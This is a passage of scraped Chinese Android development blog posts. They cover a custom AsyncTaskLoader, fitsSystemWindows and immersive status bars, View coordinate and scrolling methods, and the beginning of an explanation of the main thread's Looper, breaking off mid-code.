自定义一个Loader(加载数据类型，Cache处理等)Loader的使用就像一个AsyncTask一样，可以提前指定需要在异步线程中做的事情、数据类型以及完成加载后将数据推送到主线程。谷歌给出了一个使用Loader来查询手机上安装的App并显示在一个ListView中的DemoApp，虽然是好几年前的东西了，并且使用的是V4包里的Loader,但还是值得学习。首先来看自定义的AppListLoader public class AppListLoader extends AsyncTaskLoader&lt;List&lt;AppEntry&gt;&gt; { //AsynTaskLoader支持泛型，AppEntry是已安装App信息的包装类。 private List&lt;AppEntry&gt; mApps; //查询的App列表保存为成员变量 final PackageManager mPm; private boolean DEBUG = true; public static final String TAG = AppListLoader.class.getSimpleName(); //构造函数 public AppListLoader(Context ctx) { // Loaders may be used across multiple Activitys (assuming they aren&#39;t // bound to the LoaderManager), so NEVER hold a reference to the context // directly. Doing so will cause you to leak an entire Activity&#39;s context. // The superclass constructor will store a reference to the Application // Context instead, and can be retrieved with a call to getContext(). super(ctx); //第一，这里运行在主线程上； //第二，传进来的context(一般是Activity只是为了获取ApplicationContext) mPm = getContext().getPackageManager();//getContext()返回的是Application的Context。 } @Override public List&lt;AppEntry&gt; loadInBackground() { if (DEBUG) Log.i(TAG, &quot;+++ loadInBackground() called! +++&quot;); LogUtil.p(&quot;&quot;);// 子线程,耗时的工作放到这里 // Retrieve all installed applications. List&lt;ApplicationInfo&gt; apps = mPm.getInstalledApplications(0);//PackageManager的方法 if (apps == null) { apps = new ArrayList&lt;ApplicationInfo&gt;(); } // Create corresponding array of entries and load their labels. List&lt;AppEntry&gt; entries = new ArrayList&lt;AppEntry&gt;(apps.size()); for (int i = 0; i &lt; apps.size(); i++) { AppEntry entry = new AppEntry(this, apps.get(i)); entry.loadLabel(getContext()); entries.add(entry); } // Sort the list. Collections.sort(entries, ALPHA_COMPARATOR); return entries; } @Override public void deliverResult(List&lt;AppEntry&gt; apps) { //运行在主线程上 if (isReset()) {//这里就类似于AsyncTask的onPostExecute了，把子线程处理好的数据推送到主线程 if (DEBUG) Log.w(TAG, &quot;+++ Warning! An async query came in while the Loader was reset! +++&quot;); // The Loader has been reset; ignore the result and invalidate the data. // This can happen when the Loader is reset while an asynchronous query // is working in the background. That is, when the background thread // finishes its work and attempts to deliver the results to the client, // it will see here that the Loader has been reset and discard any // resources associated with the new data as necessary. if (apps != null) { releaseResources(apps); return; } }//如果调用了reset()方法，说明子线程加载的数据是无效的，释放资源，处理无效数据 // Hold a reference to the old data so it doesn&#39;t get garbage collected. // We must protect it until the new data has been delivered. List&lt;AppEntry&gt; oldApps = mApps; mApps = apps; if (isStarted()) {// 如果一切正常，即调用了startLoading且stopLoading和reset均为被调用 if (DEBUG) Log.i(TAG, &quot;+++ Delivering results to the LoaderManager for&quot; + &quot; the ListFragment to display! +++&quot;); // If the Loader is in a started state, have the superclass deliver the // results to the client. super.deliverResult(apps); } // Invalidate the old data as we don&#39;t need it any more. if (oldApps != null &amp;&amp; oldApps != apps) { if (DEBUG) Log.i(TAG, &quot;+++ Releasing any old data associated with this Loader. +++&quot;); releaseResources(oldApps); } } } 到此，数据加载的Server端算是完成，这里注意调用到了isReset()、isStarted()等方法，这些就是Server端在在处理Client端生命周期是需要注意的，这个后面再说。 2. 使用LoaderManager管理Loader我们使用LoaderManager在Activity或Fragment中与Loader交互。通常在onCreate或者onActivityCreated中: getSupportedLoaderManager.initLoader()//Activity中getLoaderManager() //Fragment中 这里介绍在Fragment中的使用，因为Loader处理好了与Activity,Fragment甚至Child Fragment的生命周期。推荐使用v4包里的Loader，Loader是在Android3.0引入FrameWork中的，但v4包让Loadder在更早的版本上也有相应的API。更重要的是，v4 包中的Loader是伴随着v4包新的release step，也就是说v4包会与时俱进修复其中的bug。这一点在medium上有介绍 。再看一下这个方法 public abstract Loader initLoader(int id, Bundle args, LoaderManager.LoaderCallbacks callback); Demo中使用的是Fragment： // Initialize a Loader with id ‘1’. If the Loader with this id already // exists, then the LoaderManager will reuse the existing Loader. getLoaderManager().initLoader(LOADER_ID, null, this); 相对应的Fragment需要implements LoaderManager.LoaderCallbacks&lt;List&gt; //注意泛型这个接口有三个方法 public interface LoaderCallbacks&lt;D&gt; { public Loader&lt;D&gt; onCreateLoader(int id, Bundle args); public void onLoadFinished(Loader&lt;D&gt; loader, D data); public void onLoaderReset(Loader&lt;D&gt; loader); } 看一下Demo中是如何实现的 @Override public android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; onCreateLoader(int id, Bundle args) { if (DEBUG) Log.i(TAG, &quot;+++ onCreateLoader() called! +++&quot;); return new AppListLoader(getActivity()); } @Override public void onLoadFinished(android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; loader, List&lt;AppEntry&gt; data) { if (DEBUG) Log.i(TAG, &quot;+++ onLoadFinished() called! +++&quot;); mAdapter.setData(data);//加载数据到UI if (isResumed()) { setListShown(true); } else { setListShownNoAnimation(true); } } @Override public void onLoaderReset(android.support.v4.content.Loader&lt;List&lt;AppEntry&gt;&gt; loader) { if (DEBUG) Log.i(TAG, &quot;+++ onLoadReset() called! +++&quot;); mAdapter.setData(null);//loader被reset，UI这边需要清除所有与Loader数据相关的引用，但清除数据的任务会由Loader处理好 } 在三个明显的回调中处理好数据绑定到UI及过期数据的清理即可。 3. 处理Activity生命周期的问题回到server端(Loader),AsyncTaskLoader是一个abstract class，loadInBackground方法已经实现了，但还有几个方法强调必须要复写或者与生命周期相关 @Override protected void onStartLoading() { /* Subclasses must implement this to take care of loading their data, as per {@link #startLoading()}. This is not called by clients directly, but as a result of a call to {@link #startLoading()}.*/ //在这里检查一下成员变量中的数据是否不为空，有数据的话，deliverResults } @Override protected void onStopLoading() { /*Subclasses must implement this to take care of stopping their loader, as per {@link #stopLoading()}. This is not called by clients directly, but as a result of a call to {@link #stopLoading()}. This will always be called from the process&#39;s main thread.*/ } @Override protected void onReset() { /* Subclasses must implement this to take care of resetting their loader, as per {@link #reset()}. This is not called by clients directly, but as a result of a call to {@link #reset()}. This will always be called from the process&#39;s main thread. 如果调用了destoryLoader或者Loader相关联的Activity/Fragment被destory了 所以在Demo中可以看到onReset里面调用了onStopLoading去取消当前任务，同时释放资源，取消广播注册*/ } @Override public void onCanceled(List&lt;AppEntry&gt; apps) { /* Called if the task was canceled before it was completed. Gives the class a chance to clean up post-cancellation and to properly dispose of the result. @param data The value that was returned by {@link #loadInBackground}, or null if the task threw {@link OperationCanceledException}.*/ //在这里释放资源 } @Override public void forceLoad() { /*Force an asynchronous load. Unlike {@link #startLoading()} this will ignore a previously loaded data set and load a new one. This simply calls through to the implementation&#39;s {@link #onForceLoad()}. You generally should only call this when the loader is started -- that is, {@link #isStarted()} returns true. Must be called from the process&#39;s main thread.*/ //startLoading会直接使用onConfigurationchange之前的Activity中Loader加载的数据，但这里则放弃旧的数据，重新加载，所以isStarted会在这时返回true } 考虑一下，如果在加载数据过程中数据源发生了变化，比如在扫描已安装App过程中又安装了新的App怎么办？所以这里又注册了两个广播，在onReceive的时候调用 mLoader.onContentChanged(); //这会直接调用forceLoad（Loader已经started）或者设置一个标志位，让takeContentChanged（）返回true在onStartLoading中发现这个为true，直接forceLoad//接下来进入loadInBackground,完成后进入deliverResultdeliverResult首先检查Activity是否destoryed(挂了直接释放资源),没挂的话判断下isStarted(是否一切正常，未调用过stopLoading或reset)，符合条件的话通过super.deliverResult把数据传递出去。接下来判断下之前的旧数据和新数据是否一致，否则释放掉旧数据 整个过程考虑到了数据的有效性，资源的释放，在Loader这一端，通过isReset,isStarted等方法确保了不确定的数据加载过程能够和不确定的生命周期和谐共处。网上看到的关于Loader的文章大部分是关于CursorLoader的，也就是和数据库打交道的那一块，这里不细说。主要是目前没有看到太多App中使用这种加载模式，可能确实有点麻烦。在Medium上看到这篇文章，觉得还是有必要做一些记录的。 4. 关于性能最后我想说的是，AsyncTaskLoader内部使用的还是AsyncTask那一套，关于AsyncTask的串行和并行的讨论网上有很多。于是我看了下AsyncTaskLoader中最终调用AsyncTask的execute方法: mTask.executeOnExecutor(mExecutor, (Void[]) null); 至于这个mExecutor的本质: public static final Executor THREAD_POOL_EXECUTOR = new ThreadPoolExecutor(CORE_POOL_SIZE, MAXIMUM_POOL_SIZE, KEEP_ALIVE, TimeUnit.SECONDS, sPoolWorkQueue, sThreadFactory);CORE_POOL_SIZE = 5嗯，并行的线程池，性能应该还不错。学过rxjava，是否rxjava会是一种比loader更好的加载数据的方式呢 Reference rxLoader making loading data on android lifecycle aware AppListLoader","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"fitSystemWindow和沉浸式状态栏的一些总结","date":"2016-10-14T17:15:47.000Z","path":"2016/10/14/2016-10-14-Android-translucent-status-bar/","text":"沉浸式状态栏是api 19之后引入的，KitKat应该算是一次比较大的更新了，像是Transition，art runtime,storage access FrameWork(这个有空研究下)，另外就是这个被官方称为Full-screen immersive mode的特性了。具体来说，App可以将展示的区域拓展到statusBar的位置了。我觉得直接叫statusBar就好了，大部分人应该也能理解这就是手机上显示”中国移动”还有显示手机电量那一块的长条，宽度是match_parent。高度的话，据说是25dp，然后6.0上给改成了24dp。不过这不是重点 1.最初的做法看到有人推荐使用SystemBarTint这个class,刚上来觉得也挺好用的，就是一个java class，直接复制粘贴到项目里，改一下package name，无脑使用即可。原理的话，看过源码后，大致明白是在statusBar的位置添加一个new View，然后持有这个view的引用，接下来就可以做常规的setBackground或者setBackgroundColor了。初始化时的关键代码如下 private void setupStatusBarView(Context context, ViewGroup decorViewGroup) {//这个decorViewGroup指的是activity.getWindow() mStatusBarTintView = new View(context); LayoutParams params = new LayoutParams(LayoutParams.MATCH_PARENT, mConfig.getStatusBarHeight()); params.gravity = Gravity.TOP; if (mNavBarAvailable &amp;&amp; !mConfig.isNavigationAtBottom()) { params.rightMargin = mConfig.getNavigationBarWidth(); } mStatusBarTintView.setLayoutParams(params); mStatusBarTintView.setBackgroundColor(DEFAULT_TINT_COLOR); mStatusBarTintView.setVisibility(View.GONE); decorViewGroup.addView(mStatusBarTintView); } 一切看起来都很美好 2. 直到碰到了fitSystemWindow = ture几个月前曾经在项目里写过一个普通的Coordinatelayout内部CollapingToolbarLayout的沉浸式状态栏实现，当时为了赶进度一直试到夜里2点才尝试出在4.4和5.0以上手机都能满意的效果。现在想想有些事还是能够事先搞清楚的好，被动学习的代价实在太大。当时的方法是给Toolbar添加了一个顶部的padding，具体原理也不大清楚。但实际上并不总能一直 3. 使用CollapsingToolbarLayout时的问题 5.0以上的手机似乎很简单 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;android.support.design.widget.CoordinatorLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; android:id=&quot;@+id/coordinateLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:background=&quot;@android:color/background_light&quot; android:fitsSystemWindows=&quot;true&quot; &gt; &lt;android.support.design.widget.AppBarLayout android:id=&quot;@+id/appbarLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;300dp&quot; android:theme=&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot; android:fitsSystemWindows=&quot;true&quot; &gt; &lt;android.support.design.widget.CollapsingToolbarLayout android:id=&quot;@+id/collapsingToolbarLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; app:contentScrim=&quot;?attr/colorPrimary&quot; app:expandedTitleMarginEnd=&quot;64dp&quot; app:expandedTitleMarginStart=&quot;48dp&quot; app:layout_scrollFlags=&quot;scroll|exitUntilCollapsed&quot; &gt; &lt;ImageView android:id=&quot;@+id/backdrop&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:scaleType=&quot;centerCrop&quot; android:src=&quot;@drawable/image_19&quot; app:layout_collapseMode=&quot;parallax&quot; android:fitsSystemWindows=&quot;true&quot; /&gt; &lt;android.support.v7.widget.Toolbar android:id=&quot;@+id/toolbar&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;?attr/actionBarSize&quot; app:layout_collapseMode=&quot;pin&quot; app:popupTheme=&quot;@style/ThemeOverlay.AppCompat.Light&quot; /&gt; &lt;/android.support.design.widget.CollapsingToolbarLayout&gt; &lt;/android.support.design.widget.AppBarLayout&gt; &lt;android.support.v4.widget.NestedScrollView android:id=&quot;@+id/nestedScrollView&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; &gt; &lt;TextView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:lineSpacingExtra=&quot;8dp&quot; android:padding=&quot;@dimen/activity_horizontal_margin&quot; android:text=&quot;@string/newsBody&quot; android:textSize=&quot;20sp&quot; /&gt; &lt;/android.support.v4.widget.NestedScrollView&gt; &lt;android.support.design.widget.FloatingActionButton android:id=&quot;@+id/fab&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_margin=&quot;@dimen/activity_horizontal_margin&quot; android:src=&quot;@android:drawable/ic_menu_slideshow&quot; app:layout_anchor=&quot;@id/appbarLayout&quot; app:layout_anchorGravity=&quot;bottom|right|end&quot; /&gt; &lt;/android.support.design.widget.CoordinatorLayout&gt; 只要分别在CoordinateLayout，AppBarLayout和CollapsingToolbarLayout的xml属性中加上android:fitSystemWindow = “true”java代码里添加一句 getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); //注意下版本判断 或者在当前Activity的values-v19 styles中添加 true就行了。实际效果就是图片完全展开时可以扩展到statusBar下面，图片收缩起来后可以让Toolbar停在statusBar下面。但同样的代码在4.4的手机上会使得实际绘图区域落到statusBar以下，statusBar位置变成带灰色遮罩的白色背景。 4. fitSystemWindow是什么意思fitSystemWindows属性：官方描述:Boolean internal attribute to adjust view layout based on system windows such as the status bar. If true, adjusts the padding of this view to leave space for the system windows. Will only take effect if this view is in a non-embedded activity.简单来说就是如果设置为true,在设置了透明状态栏或者导航栏时，此view的所有padding属性失效(透明状态栏的话，paddingTop等于状态栏高度；透明导航栏的话，paddingBootm等于NavigationBar的高度) 假定:布局文件只是一个普通的LinearLayout(fitSystemWindow = false（默认情况）),顶部include一个toolbar(fitSystemWindow = true )就已经可以实现4.4以下，4.4-5.0，5.0以上的各种场景了,(前提，使用Appcompat 的Theme，因为它会使用colorPrimaryDark为statusBar着色) 但我的问题在于布局文件是CoordinateLayout&gt; AppBarLyout&gt; CollapsingToolbarLayout&gt; Toolbar &amp; ImageView这种情况下，照理说Toolbar应该顶部留有25dp的padding，也就是fitSystemWindow = true（假设就只是这么简单）然而事实是，fitSystemWindow会让你设置的padding失效,而ImageView需要侵入到statusBar下面，也就是fitSystemWindow = false。那就只要在toolbar的xml中添加fitSystemWindow这个属性好了。编译，运行，5.1手机，Toolbar的小箭头一部分跑到statusBar下面了，感觉就像Toolbar往上移动了25dp(这个目测的哈)，不可取。 5. 查找到的一些解决方案 主要介绍原理了: 类似于SystemBarTint，在android.R.id.content的View中添加一个 ViewViewGroup.LayoutParams statusViewLp = new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, getStatusBarHeight()); contentView.addView(statusBarView,layoutParams) Activity持有一个PhoneWindow，PhoneWindow持有一个根View，叫DecorView（是一个FrameLayout），DecorView持有一个LinearLayout，在LinearLayout下分配两个FrameLayout，一个给ActionBar（当设置主题为NoActionBar是为ViewStub），一个给ContentView。不管如何，只要我们在LinearLayout的第一个位置插入一个View就可以让ContentView下移了。简书作者这种方式其实已经无所谓是否需要在xml中fitSystemWindow了，因为都会通过添加最后一个View的方式把状态栏那块给遮住了。用来着色其实挺好的。 往android.R.id.content这个View里面添加一个假View,xml中fitSystemWindows 往android.R.id.content这个View的parent里面添加一个假View,xml中fitSystemWindows 6.我最后实现的解决方案（4.4,5.1均通过）其实整个问题的关键就是你是否想要在statusBar那一块长条的位置画画。。。。一整张imageView的话，当然希望能够把图片延伸到statusBar以下而Toolbar则不需要延伸到statusBar以下。我尝试了给toolbar加上padding &gt;&gt;失败我尝试了给toolbar加上margin &gt;&gt;&gt;&gt; 问题终于解决 所以最后，我的xml文件中删除了所有的fitSystemWindow，在style-v19中添加了该加的东西最后只在onCreate里面添加几段话 setSupportActionBar(binding.toolbar); getSupportActionBar().setDisplayHomeAsUpEnabled(true); //这个用于显示返回的小箭头，还得指明parentActivity getSupportActionBar().setTitle(&quot;&quot;); CollapsingToolbarLayout.LayoutParams params = (CollapsingToolbarLayout.LayoutParams) binding.toolbar.getLayoutParams(); params.setMargins(0, Utils.getStatusBarHeight(), 0, 0); //顶部加个margin就好了 binding.toolbar.setLayoutParams(params); 实际操作可能还要判断非空什么的，但大致意思如此看起来像这样5.1图片展开: 5.1图片收起: 4.4图片展开: 4.4图片收起: 原理就是让整个布局占据statusBar的位置，但把Toolbar往下挪一点（其实也就是这篇文章中所推荐的给contentView的给第一个childView添加marginTop的方法） 7.在onCreate之后设置fitSystemWindows并不会把ContentView往上挪或往下挪.自己测试了一下，在根布局里添加fitSystemWindows = true之后，在Activity的onCreate里面是可以使用ViewCompat.setfitSystems(rootView,false)设置起作用的。但也只限于onCreate的时候。例如添加一个点击事件，在onClick里面setFitSystemWindows，是不会把RootView往下挪的。这种情况就需要一开始就确保fitSystem = false，然后需要往下挪的时候，给设置一个FrameLayout.LayoutParams的TopMargin就可以了。注意来回切换(全屏模式和着色模式之间切换)的时候要看下rootView的getTop,因为MarginTop设置了之后会导致Top!=0。其实fitSystemWindows是在FitSystemWindowLinearLayout中添加Padding起效的，后期操作的Margin只是对其Child ContentFrameLayout进行操作。所以，这种情况下我觉得直接全部弄成fitSystemWindows = false，先把statusBar后面的空间占据了再说，后面再通过手动设置Margin上下挪动。 8. 一些不要犯的小错误 在Theme中添加 &lt;item name=&quot;android:fitsSystemWindows&quot;&gt;true&lt;/item&gt; 这会导致Toast的文字往上偏移，所以，如果需要使用fitSystemWinow = true的话，请老老实实去xml中写 状态栏那一块如果你不去占据的话，而你又声明了windowTranslucentStatus，v21上默认的颜色应该是colorPrimaryDark(是的，AppCompat帮你照顾好了)v19上就是一片带阴影的白色(AppCompat不会在这个版本上帮你着色statusBar)。 6.0以上可以设置statusBar字体的颜色了，这个随便找找就有了 Ian Lake在medium上给出了对于fitSystemWindow的权威解释，非常有价值。 9. 下面这段话可能对于理解window有一定帮助fitsSystemWindows, 该属性可以设置是否为系统 View 预留出空间, 当设置为 true 时,会预留出状态栏的空间.ContentView, 实质为 ContentFrameLayout, 但是重写了 dispatchFitSystemWindows 方法, 所以对其设置 fitsSystemWindows 无效.ContentParent, 实质为 FitWindowsLinearLayout, 里面第一个 View 是 ViewStubCompat, 如果主题没有设置 title ,它就不会 inflate .第二个 View 就是 ContentView.另外，如果使用AppCompat，在api21以上，会自动将状态栏颜色设置为colorPrimaryDark。最后感谢网上各位博主不辞辛苦写出来的干货，让我能够比较简单的复制粘贴他们的代码来检验，写博客真的很累。 Updates这个是用来显示或者隐藏状态栏位置的文字的，其实也就是youtube上一个google dev的视频中的部分内容了，亲测好用，比如全屏播放视频的时候可以调用一下。 // This snippet hides the system bars. private void hideSystemUI() { // Set the IMMERSIVE flag. // Set the content to appear under the system bars so that the content // doesn&#39;t resize when the system bars hide and show. mDecorView.setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION // hide nav bar | View.SYSTEM_UI_FLAG_FULLSCREEN // hide status bar | View.SYSTEM_UI_FLAG_IMMERSIVE); } // This snippet shows the system bars. It does this by removing all the flags // except for the ones that make the content appear under the system bars. private void showSystemUI() { mDecorView.setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN); } 一旦使用了windowTranslucentSystemBar，你的Activity的Window中将不再拥有statusBarView和NavigationBarView(这也就是为什么api文档上说setStatusBarColor不能在设置了translucentFlag的前提下使用)fitSystemWindows在大部分View中的实现都是加了一个padding Chris Banes推荐的的获取statusBar的高度的方法 myView.setOnApplyWindowInsetsListener { View, inset, -&gt; val statusBarSize = insets.systemWindowInsetTop return insets } Reference Android-transulcent-status-bar总结 由沉浸式状态栏引发的血案 Android开发：Translucent System Bar 的最佳实践 Why would I want to fitsSystemWindows","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"Window","slug":"Window","permalink":"https://haldir65.github.io/tags/Window/"},{"name":"statusBar","slug":"statusBar","permalink":"https://haldir65.github.io/tags/statusBar/"}]},{"title":"安卓坐标系常用方法","date":"2016-10-13T18:17:02.000Z","path":"2016/10/13/2016-10-13-Android-coordinate-System/","text":"记录一些Android系统坐标系的常用方法，因为日常开发中难免会碰到需要单独计算View系统坐标的情况。 ScrollTo，ScrollBy，getVisibleRect这些方法平时想要用的时候总要去网上查找，这里记录下来，方便今后直接参考首先是一张很多人都见过的图中间的蓝色的点是TouchEvent发生时，获得的MotionEvent.getX()、getY()。 1. 坐标原点和坐标轴方向坐标原点有两种，屏幕左上角（statusBar也包含其中）和父控件左上角坐标轴方向：X轴向右，Y轴向下，Z轴(5.0增加)向上。 2. Left,Top,Right,Bottom而Top，left，bottom,down分别对应着其其相对于父控件的距离，由此可以计算得到View的宽度width = getRight()-getLeft() ,View的高度 height = getBottom()-getTop()而实际上view.getHeight()方法的实现也就是mBottom-mTop. 3. X , YX代表的是当前View的左上角那个点的横坐标，Y代表的是纵坐标。X = left + getTranslationXY = Top + getTranslationY通常在动画中使用setTranslationX来实现偏移效果，注意，这是不会改变left的。在滑动过程中，x, y会随着改变。 4. 几个跟Rect相关的获得的是当前View左上角距离屏幕左上角的位置，为此我专门测试了一下 W/ViewAnimationActivity.java: [32 | onWindowFocusChanged]statusBarHeight = 75 W/ViewAnimationActivity.java: [35 | onWindowFocusChanged]getLocationInWindow x = 0 y = 75 W/ViewAnimationActivity.java: [38 | onWindowFocusChanged]getLocationOnScreen x = 0 y = 75可以看到返回的就是View左上角的坐标，一般情况下两者区别不重要，stackoverFlow上有讨论 View.getLocationInWindow(pos); //获取在当前window内的绝对坐标 View.getLocationOnScreen(pos); //包括statusBar，以屏幕左上角为坐标原点 View.getLocalVisibleRect() //以view自身的左上角为坐标原点，这个很有用， //返回的坐标一定是(0,0,xxx,xxx)这样的，可以判断当前View是否完全可见 View.getGlobalVisibleRect() // 以屏幕左上角为坐标原点 以上四个方法在onCreate里面返回的值都是0，需要在Activity的onWindowFocusChanged(true)中去获得这里需要扯一点关于window的问题，根据大部分博客的介绍：DecorView是FrameLayout的子类，是View视图层级树的根节点。一般会有一个LinearLayout的child 为此，我在setContentView里面放了一个CoordinateLayout,使用Hierarchy View截图的到这样的结果。图片有点大 在ViewHirearchy中可以看到，Activity中View视图层级从上到下依次为： PhoneWindow$DecorView（有三个child,分别是LinearLayout，View(id/statusBarBackground)和View(id/navigationBarBackground)）LinearLayoutFrameLayoutFitWindowsLinearLayoutContentFrameLayout(id/android.R.id.content) //这在开发过程中有时会用到setContentView设置的view 关于window，DecorWindow的文章网上有很多，仔细研究下会对理解View的测量机制有一定好处，这对于View的工作原理也能够更彻底的理解。参考文章日常开发中，setContentView这个方法只是将我们自己写的activiy_main.xml布局文件inflate出来的view添加到android.R.id.content这个ViewGroup中，实践下来发现这是一个ContentFrameLayout的实例，它的child只有一个，就是我们通过setContentView添加的View 5. 让View滑动起来 offsetLeftAndRight(int offset) //给left和right加上一个值，改变的是View的位置offsetTopAndBottom(int offset) scrollTo(int x,int y) // 将View中的内容移动，坐标原点为parentView左上角，注意，参数为正，效果为反例如scrollTo(-100,0) 在手机上看效果是往右移动了 scrollBy(int x, int y) scrollBy的源码如下: public void scrollBy(int x, int y) { scrollTo(mScrollX + x, mScrollY + y); } 还有一些不常用的： public void setScrollX(int value) { scrollTo(value, mScrollY); } 6. 改变LayoutParams的margin让View移动这是一种很生硬的方式，不常用 MarginLayoutParams params = (MarginLayoutParams)mTextView.getLayoutParams(); //可能为null params.leftMargin + = 100; mTextView.setLayoutParams();// 这里面调用了requestLayout 7.使用Animation让View动起来根据官方文档的定义Android中一共两种Animation: Property AnimationView Animation(包括Tween animation, Frame animation) 首先从package的位置来看属性动画都位于android.animation这个package下面，常见的如ObjectAnimator继承自ValueAnimatorView动画则位于android.view.animation这个package下，常见的如TranslateA,AlphaAnimation等 View Animation可以代码创建，也可以写在R.anim文件夹下,用法很简单 ImageView image = (ImageView) findViewById(R.id.image); Animation hyperspaceJump = AnimationUtils.loadAnimation(this, R.anim.hyperspace_jump); image.startAnimation(hyperspaceJump); 属性动画可以代码创建，也可以写在R.animator文件夹下,用法: AnimatorSet set = (AnimatorSet) AnimatorInflater.loadAnimator(myContext, R.anim.property_animator); set.setTarget(myObject); set.start(); 推荐使用ViewPropertyAnimator，这是一个位于android.view下面的class，感觉更像是一个Util,大部分的方法都是在API 12 ,API 14引入的，实际开发中推荐使用ViewCompat.animate() 返回一个ViewPropertyAnimator对象，省去了开发者版本判断的麻烦语法更为简单： ViewCompat.animate(view).x(500).y(500).setDuration(5000).setInterpolator(new DecelaratorInterpolator()); //不需要调用start() 据说这种方式性能最好，Google官方强烈推荐,参考DevByte。另外，据说大部分Google的App使用的都是DecelaratorInterpolator，当然这跟设计有关。 8.使用Scroller实现smoothScrollView有一个方法computeScroll(),复写，像这样就可以了 Scroller scroller = new Scroller(mContext); private void smoothScrollTo(int dstX, int dstY) { int scrollX = getScrollX(); int delta = dstX - scrollX; scroller.startScroll(scrollX, 0, delta, 0, 1000); invalidate(); } @Override public void computeScroll() { if (scroller.computeScrollOffset()) { scrollTo(scroller.getCurrX(), scroller.getCurY()); postInvalidate(); } } 9. 补充几个好玩的函数View.canScrollVertically(int) public static boolean canChildScrollUp(View view) { if (android.os.Build.VERSION.SDK_INT &lt; 14) { if (view instanceof AbsListView) { final AbsListView absListView = (AbsListView) view; return absListView.getChildCount() &gt; 0 &amp;&amp; (absListView.getFirstVisiblePosition() &gt; 0 || absListView.getChildAt(0) .getTop() &lt; absListView.getPaddingTop()); } else { return view.getScrollY() &gt; 0; } } else { return view.canScrollVertically(-1); } } 这段是我在秋百万的android-ultra-pulltorefresh里面找到的，想当初为了自己写下拉刷新，一遍一遍的打Log，最后甚至用上getVisibleRect才算搞定。其实很多东西前人已经帮我们整理好了。对了这东西在v4包里有ViewCompat.canScrollVertically，v4包除了方法数有点多(10k+好像)这点不好以外，一直都很好用附上supportLibrary各个包的方法数，如果对65536这个数字熟悉的话，还是会注意点的。 总结 使用getLocalVisibleRect可以判断一个view是否完全可见 scrollBy,setScrollX等内部都是调用了scrollTo方法，ScrollTo方法传参数与实际效果是相反的 updatesAndroid device Monitor里面有一个Dump UI Hierarchy for UI Automator，直接查看视图层级 Reference Android应用坐标系统全面详解 ​[如何取得View的位置之View.getLocationInWindow()的小秘密](http://blog.csdn.net/imyfriend/article/details/8564781 详解实现Android中实现View滑动的几种方式","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"TouchEvent","slug":"TouchEvent","permalink":"https://haldir65.github.io/tags/TouchEvent/"}]},{"title":"主线程的工作原理","date":"2016-10-12T16:47:42.000Z","path":"2016/10/12/2016-10-12-How-the-mainThread-work/","text":"​ 今天突然找到这样一个问题: “Handler的postDelayed会阻塞线程吗？”。基于自己之前对于Handler的线程间通讯机制的理解，还是不能给出明确的答案。正好打算把一篇关于主线程的工作原理的文章写出来，顺带看下能否把这个问题从源码的角度解释清楚。 1. 从线程（Thread）开始通常，一个Process会有一个主线程, 而在Android中，UI控件相关的方法和一些系统callback都会发生在主线程上(onResume,onCreate,onStartCommand,onDraw, etc)。 如果App中使用了多个Process，则每个Process都会有一个主线程，但这不是今天的重点。Android应用是如何启动的?启动一个应用时，系统会从Zygote Process fork出一个新的Process，最终走到ActivityThread 的main方法 public static void main(String[] args) { //省略部分无关代码 Looper.prepareMainLooper(); ActivityThread thread = new ActivityThread(); thread.attach(false); if (sMainThreadHandler == null) { sMainThreadHandler = thread.getHandler(); } // End of event ActivityThreadMain. Looper.loop(); throw new RuntimeException(&quot;Main thread loop unexpectedly exited&quot;);//从这里可以猜到Looper.loop方法会一直执行下去 } 看一下Looper.prepareMainLooper()方法： /** * Initialize the current thread as a looper, marking it as an * application&#39;s main looper. The main looper for your application * is created by the Android environment, so you should never need * to call this function yourself. See also: {@link #prepare()} */ public static void prepareMainLooper() { prepare(false); synchronized (Looper.class) { if (sMainLooper != null) { throw new IllegalStateException(&quot;The main Looper has already been prepared.&quot;); } sMainLooper = myLooper(); } } 大致意思就是为当前Thread添加一个Looper。Looper.java是一个普通的class，其大致作用就是为当前Thread维持一个message loop，默认情况下一个Thread并没有一个Looper，要想添加一个，需要在该线程中调用Looper.prepare()，然后调用Looper.loop()方法即可让消息循环一直持续下去。大部分和message Loop的交互都是通过Handler这个类来进行的。例如 class LooperThread extends Thread { public Handler mHandler; public void run() { Looper.prepare(); mHandler = new Handler() { public void handleMessage(Message msg) { // 在这里处理消息 } }; Looper.loop(); //这里面发送消息 } } Looper持有一个MessageQueue(消息队列)成员变量，消息循环时，Looper就不断地从消息队列中拿出消息进行处理。下面来看Looper.loop()方法里所做的事： /** 删除了部分不相关的代码 * Run the message queue in this thread. Be sure to call * {@link #quit()} to end the loop. */ public static void loop() { final Looper me = 